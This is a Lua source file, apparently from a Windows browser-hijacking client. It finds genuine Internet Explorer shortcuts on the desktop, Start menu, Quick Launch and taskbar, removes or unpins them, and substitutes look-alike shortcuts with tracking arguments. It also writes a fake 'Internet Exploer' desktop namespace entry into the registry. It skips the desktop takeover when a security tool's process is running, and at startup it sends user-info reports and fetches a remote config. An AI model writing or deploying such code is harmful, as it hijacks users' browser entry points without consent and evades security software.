			local strFilePath = tipUtil:PathCombine(strBaseDir, "Internet Explorer.lnk")
			local bIsInDir,strCurrent = CheckIsIELnkInDir(strBaseDir)
			if bIsInDir then
				FunctionObj.PinToStartMenu4XP(strCurrent, false)
				CutBackUpLnk(strCurrent,"STARTMENU")
				FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\STARTMENU", "1")
			end
			
			local strFilePath1 = tipUtil:PathCombine(strBaseDir, "Internet Explorer.lnk")
			local bIsInDir1,strCurrent1 = CheckIsIELnkInDir(strBaseDir)
			if bIsInDir1 then
				FunctionObj.PinToStartMenu4XP(strCurrent1, false)
				CutBackUpLnk(strCurrent1,"STARTMENU")
				FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\STARTMENU", "1")
			end
		end
	end
end


--开始菜单\程序  目录
function WriteStartMenuProgramSC()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local nCSIDL_COMMON_PROGRAM = 0x17
	local nCSIDL_PROGRAM = 0x2
	local tProgramClsidl = {nCSIDL_COMMON_PROGRAM, nCSIDL_PROGRAM}
	
	for _, nCsidl in pairs(tProgramClsidl) do
		local strBaseDir = tipUtil:GetSpecialFolderPathEx(nCsidl)
		if IsRealString(strBaseDir) and tipUtil:QueryFileExists(strBaseDir) then
		
			local strFilePath = tipUtil:PathCombine(strBaseDir, "Internet Explorer.lnk")
			local bIsInDir,strCurrent = CheckIsIELnkInDir(strBaseDir)
			if bIsInDir then
				FunctionObj.PinToStartMenu4XP(strCurrent, false)
				CutBackUpLnk(strCurrent,"SMPROGRAMS")
				FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\SMPROGRAMS", "1")
			end
			
			local bIsInDir1,strCurrent1 = CheckIsIELnkInDir(strBaseDir)
			if bIsInDir1 then
				FunctionObj.PinToStartMenu4XP(strCurrent1, false)
				CutBackUpLnk(strCurrent1,"SMPROGRAMS")
				FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\SMPROGRAMS", "1")
			end
			
			local strIEPath = GetIEPath()

			if nCsidl == nCSIDL_PROGRAM then
				local bret = tipUtil:CreateShortCutLinkEx("Internet Explorer", strIEPath, strBaseDir, "", "/sstartfrom startmenuprograms", "启动 Internet Explorer 浏览器")
				if bret then
					FunctionObj.PinToStartMenu4XP(strFilePath, true)
				end
			end	
		end
	end
end

--快速启动栏
function WriteQuickLaunchSC()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	
	if FunctionObj.IsUACOS() then
		FunctionObj.TipLog("[WriteQuickLaunchSC] is uac , return")
		return
	end
		
	local nCSIDL_APPDATA = 0x1A
	local strBaseDir = tipUtil:GetSpecialFolderPathEx(nCSIDL_APPDATA)
	local strQueryDir = tipUtil:PathCombine(strBaseDir, "Microsoft\\Internet Explorer\\Quick Launch") 
	if IsRealString(strQueryDir) and tipUtil:QueryFileExists(strQueryDir) then
		local strFilePath = tipUtil:PathCombine(strQueryDir, "Internet Explorer.lnk")
		local bIsInDir,strCurrent = CheckIsIELnkInDir(strQueryDir)
		if bIsInDir then
			CutBackUpLnk(strCurrent,"QUICKLAUNCH")
			FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\QUICKLAUNCH", "1")
		end
		
		local bIsInDir1,strCurrent1 = CheckIsIELnkInDir(strQueryDir)
		if bIsInDir1 then
			CutBackUpLnk(strCurrent1,"QUICKLAUNCH")
			FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\QUICKLAUNCH", "1")
		end
		
		local strIEPath = GetIEPath()
		local bret = tipUtil:CreateShortCutLinkEx("Internet Explorer", strIEPath, strQueryDir, "", "/sstartfrom toolbar", "启动 Internet Explorer 浏览器")
	end
end


---userpin 
function WriteTaskBarPin()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	
	if not FunctionObj.IsUACOS() then
		FunctionObj.TipLog("[WriteTaskBarPin] not uac , return")
		return
	end
	
	local strBaseDir = tipUtil:GetUserPinPath()
	if not IsRealString(strBaseDir) then
		return
	end
	strQueryDir = tipUtil:PathCombine(strBaseDir, "TaskBar")
	
	FunctionObj.TipLog("[WriteTaskBarPin] begin")
	if IsRealString(strQueryDir) and tipUtil:QueryFileExists(strQueryDir) then
		
		local bIsInDir,tFilePath = GetIELnkListFromDir(strQueryDir)
		if bIsInDir then
			local bHasCopy = false
			for _, strFilePath in pairs(tFilePath) do
				if not bHasCopy and not CheckIsFakeIELnk(strFilePath) then
					CopyBackUpLnk(strFilePath, "QUICKLAUNCH")
					bHasCopy = true
				end
			
				tipUtil:ShellExecute(0, "taskbarunpin", strFilePath, "", 0, "SW_HIDE")
				tipUtil:DeletePathFile(strFilePath)
			end
			
			FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\QUICKLAUNCH", "1")
		end

		local strIEPath = GetIEPath()
		local _, _, strProgramDir = string.find(strIEPath, "(.*)\\[^\\]*$")
		local strLnkPath = tipUtil:PathCombine(strProgramDir, "Internet Explorer.lnk")
		if not tipUtil:QueryFileExists(strLnkPath) then
			tipUtil:CreateShortCutLinkEx("Internet Explorer", strIEPath, strProgramDir, "", "/sstartfrom toolbar", "启动 Internet Explorer 浏览器")
		end
		
		tipUtil:ShellExecute(0, "taskbarpin", strLnkPath, "", 0, "SW_HIDE")
	end
end


function WriteStartPin()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	
	if not FunctionObj.IsUACOS() then
		FunctionObj.TipLog("[WriteStartPin] not uac , return")
		return
	end

	local strBaseDir = tipUtil:GetUserPinPath()
	if not IsRealString(strBaseDir) then
		return
	end
	strQueryDir = tipUtil:PathCombine(strBaseDir, "StartMenu")
	
	FunctionObj.TipLog("[WriteStartPin] begin")
	if IsRealString(strQueryDir) and tipUtil:QueryFileExists(strQueryDir) then
		
		local bIsInDir,tFilePath = GetIELnkListFromDir(strQueryDir)
		if bIsInDir then
			
			local bHasCopy = false
			for _, strFilePath in pairs(tFilePath) do
				if not bHasCopy and not CheckIsFakeIELnk(strFilePath) then
					CopyBackUpLnk(strFilePath, "STARTPIN")
					bHasCopy = true
				end
				
				tipUtil:ShellExecute(0, "startunpin", strFilePath, "", 0, "SW_HIDE")
				tipUtil:DeletePathFile(strFilePath)
			end
			
			FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\STARTPIN", "1")
		end

		local nCSIDL_PROGRAM = 0x2
		local strBaseDir = tipUtil:GetSpecialFolderPathEx(nCSIDL_PROGRAM)
		local strLnkPath = tipUtil:PathCombine(strBaseDir, "Internet Explorer.lnk")
				
		if tipUtil:QueryFileExists(strLnkPath) then
			tipUtil:ShellExecute(0, "startpin", strLnkPath, "", 0, "SW_HIDE")
		end	
	end
end


--桌面快捷方式
function WriteDesktopSC(strIniPath)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local nCSIDL_DESKTOP = 0x10 
	local nCSIDL_COMMON_DESKTOP = 0x19 
	local tCSIDL_DESKTOP = {nCSIDL_DESKTOP, nCSIDL_COMMON_DESKTOP}
	
	for _, nCsidlDesktop in pairs(tCSIDL_DESKTOP) do
		local strBaseDir = tipUtil:GetSpecialFolderPathEx(nCsidlDesktop)

		local strFilePath = tipUtil:PathCombine(strBaseDir, "Internet Explorer.lnk")
		local bIsInDir,strCurrent = CheckIsIELnkInDir(strBaseDir)
		
		if bIsInDir then
			-- local bret = tipUtil:DeletePathFile(strCurrent)
			CutBackUpLnk(strCurrent,"DESKTOP")
			FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\DESKTOP", "1")
		end
		
		if nCsidlDesktop == nCSIDL_DESKTOP then
			CreateDesktopShortCut(strIniPath)
		end
	end
end


function CreateDesktopShortCut(strIniPath)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	
	if not tipUtil:QueryFileExists(strIniPath) then
		CreateDesktopReg()
		return 
	end
		
	local tShortCutList = {"QQPCTray"}
	local strShortCutList, bRet = tipUtil:ReadINI(strIniPath, "entrytype", "shortcutlist")
	if bRet and IsRealString(strShortCutList) then
		tShortCutList = FunctionObj.SplitStringBySeperator(strShortCutList, ",")
	end

	for _, strProcessName in pairs(tShortCutList) do
		local strExeName = string.lower(tostring(strProcessName))..".exe"
		local bExists = tipUtil:QueryProcessExists(strExeName)
		if bExists then
			FunctionObj.TipLog("[CreateDesktopShortCut] blacklist process strExeName: "..tostring(strExeName))
			
			-- CreateDesktopSCDefault()
			return --黑名单目录 不做任何操作
		end
	end
	
	CreateDesktopReg()
end


function CreateDesktopSCDefault()
	-- local nCSIDL_DESKTOP = 0x10 
	-- local strBaseDir = tipUtil:GetSpecialFolderPathEx(nCSIDL_DESKTOP)
	-- local strIEPath = GetIEPath()
	-- local bret = tipUtil:CreateShortCutLinkEx("Internet Explorer", strIEPath, strBaseDir, "", "/sstartfrom desktop", "启动 Internet Explorer 浏览器")
	-- tipUtil:RefleshIcon(nil)
end


function CreateDesktopReg()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local bIs64 = FunctionObj.CheckIs64OS()
	local bInfMode = true
	
	local bret = FunctionObj.CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}", bIs64)
	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\InfoTip", "查找并显示 Iternet 上的信息和网站。", bIs64, bInfMode)
	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\LocalizedString", "Internet Explorer", bIs64, bInfMode)

	local strIEPath = GetIEPath()
	FunctionObj.CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\DefaultIcon", bIs64)
	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\DefaultIcon\\", strIEPath, bIs64, bInfMode)

	FunctionObj.CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open", bIs64)
	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open\\", "打开主页(&H)", bIs64, bInfMode)
	
	strCmd = "\"" ..strIEPath.. "\"".." /sstartfrom desktopnamespace"
	FunctionObj.CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open\\Command", bIs64)
	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Open\\Command\\", strCmd, bIs64, bInfMode)
	
	FunctionObj.CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop", bIs64)
	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop\\", "属性(&R)", bIs64, bInfMode)
		
	FunctionObj.CreateRegKey("HKEY_CLASSES_ROOT","CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop\\Command", bIs64)
	FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\CLSID\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\Shell\\Prop\\Command\\", "\"Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl\"", bIs64, bInfMode)
	
	FunctionObj.CreateRegKey("HKEY_LOCAL_MACHINE","SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{8B3A6008-2057-415f-8BC9-144DF987051A}", bIs64)
	FunctionObj.RegSetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\NameSpace\\{8B3A6008-2057-415f-8BC9-144DF987051A}\\", "Internet Exploer", bIs64, bInfMode)
end


--检查IE 快捷方式是否在指定目录
function CheckIsIELnkInDir(strDir)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tFileList = tipUtil:FindFileList(strDir, "*.*")
	
	if type(tFileList) ~= "table" then
		return false
	end
	
	for i=1, #tFileList do
		local strFilePath = tFileList[i]
		if IsRealString(strFilePath) and tipUtil:QueryFileExists(strFilePath) then
			local  strFileName = FunctionObj.GetFileNameFromPath(strFilePath, true)
			if string.find(tostring(strFileName),"Internet Explorer") or string.find(tostring(strFileName),"Internet.lnk") 
				or string.find(tostring(strFileName), "启动 Internet Explorer 浏览器") then
				return true, strFilePath
			end
		end
	end

	return false
end


--检查IE 快捷方式是否在指定目录, 有则返回路径列表
function GetIELnkListFromDir(strDir)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tFileList = tipUtil:FindFileList(strDir, "*.*")
	
	if type(tFileList) ~= "table" then
		return false
	end
	
	local tFilePath = {}
	
	for i=1, #tFileList do
		local strFilePath = tFileList[i]
		if IsRealString(strFilePath) and tipUtil:QueryFileExists(strFilePath) then
			local  strFileName = FunctionObj.GetFileNameFromPath(strFilePath, true)
			if string.find(tostring(strFileName),"Internet Explorer") or string.find(tostring(strFileName),"Internet.lnk") 
				or string.find(tostring(strFileName), "启动 Internet Explorer 浏览器") then
					tFilePath[#tFilePath+1] = strFilePath
			end
		end
	end

	if #tFilePath < 1 then
		return false
	end
	
	return true, tFilePath
end


-----------------------instal ie end---

function CreateMainTipWnd()
	local function OnCreateFuncF(treectrl)
		local rootctrl = treectrl:GetUIObject("root.layout:root.ctrl")
		local bRet = rootctrl:SetTipData()			
		if not bRet then
			return false
		end
	
		return true
	end
	PopTipWnd(OnCreateFuncF)	
end


function TipMain() 
	InitAdvFilter()
	
	CreateMainTipWnd()
	CreatePopupTipWnd()
	ProcessCommandLine()
end


function PreTipMain() 
	gnLastReportRunTmUTC = tipUtil:GetCurrentUTCTime()
	XLSetGlobal("YBYL.LastReportRunTime", gnLastReportRunTmUTC) 
	
	if not RegisterFunctionObject() then
		tipUtil:Exit("Exit")
	end
	StartRunCountTimer()

	LoadIEHelper()	
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper")
	FunctionObj.ReadAllConfigInfo()
	
	SendStartupReport(false)
	SendUserInfoReport()
	TipMain()
	
	local timerManager = XLGetObject("Xunlei.UIEngine.TimerManager")
	timerManager:SetTimer(function(item, id)
		item:KillTimer(id)
		FunctionObj.DownLoadServerConfig(AnalyzeServerConfig)
	end, 1000)	
end

PreTipMain()



